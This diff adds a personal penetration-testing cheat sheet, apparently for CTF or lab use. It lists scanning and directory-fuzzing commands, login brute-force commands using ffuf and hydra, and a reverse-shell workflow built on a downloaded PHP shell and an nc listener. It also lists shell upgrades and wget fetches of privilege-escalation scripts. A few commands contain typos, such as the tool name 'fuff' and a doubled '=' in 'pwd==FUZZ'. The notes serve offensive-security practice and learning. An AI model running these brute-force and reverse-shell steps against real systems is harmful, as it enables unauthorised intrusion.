@@ -1,0 +1,72 @@
+             /~~88b                     888  e88~-_           
+     e88~~\ |   888 888-~88e-~88e  e88~\888 d888     888-~88e 
+    d888    `  d88P 888  888  888 d888  888 8888~~\  888  888 
+    8888      d88P  888  888  888 8888  888 8888   | 888  888  
+    Y888     d88P   888  888  888 Y888  888 Y888   | 888  888 
+.----"88__/ d88P___ 888  888  888  "88_/888  "88__/  888  888----.        
+|            -->   Z2V0IG9mZiBteSBsYXduIQ==   <--                |      															    	     														
+'----------------------------------------------------------------'                 
+               juss sum notes to get me started
+  
+ 
+nmap -sC -sV -p- -vv -oA -O full 
+nmap -sC -sV -p-     <-- this gimme what i need most the time
+
+----
+
+fuff -w /usr/share/wordlists/content.txt -t 1 -p 0.1 -u host -mc all -fc 404
+
+this been workin gud.
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x .html,.txt,.php,.bak,.back,.zip,.gz,.tar dir -u http://*host*:*port*/
+
+nikto -h *host*
+
+enum4linux -a *host*
+
+----
+
+searchsploit  --  search exploitdb from cli
+
+msfconsole
+
+----
+
+sum brute force shizz that can be tweaked. 
+
+brute username
+fuff -w /usr/share/wordlists/usernames.txt -X POST -d "username=FUZZ&password=x" -t 1 -p 0.1 -H "Content-Type: application/x-www-form-urlencode" -u host -fr 'Username is invalid'
+
+brute password 
+fuff -w /usr/share/wordlists/passwords.txt -X POST -d "log=admin&pwd==FUZZ" -t 1 -p 0.1 -H "Content-Type: application/x-www-form-urlencode" -u host -fr 'password you entered for the username admin is incorrect'%  
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http://host -s 3000 http-post-form "log=admin&pwd="^PASS^"&wp-submit=Log" -vV -f
+
+----
+
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+edit with host and nc port
+nc -vnlp port
+
+nice breakout from basic ass reverse shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+--
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+if you wanna be fancy... pfft :P
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+Ctrl + Z [Background Process]
+stty raw -echo ; fg ; reset
+stty columns 200 rows 200
+
+
+enum tools
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+https://gtfobins.github.io  --  sum magic
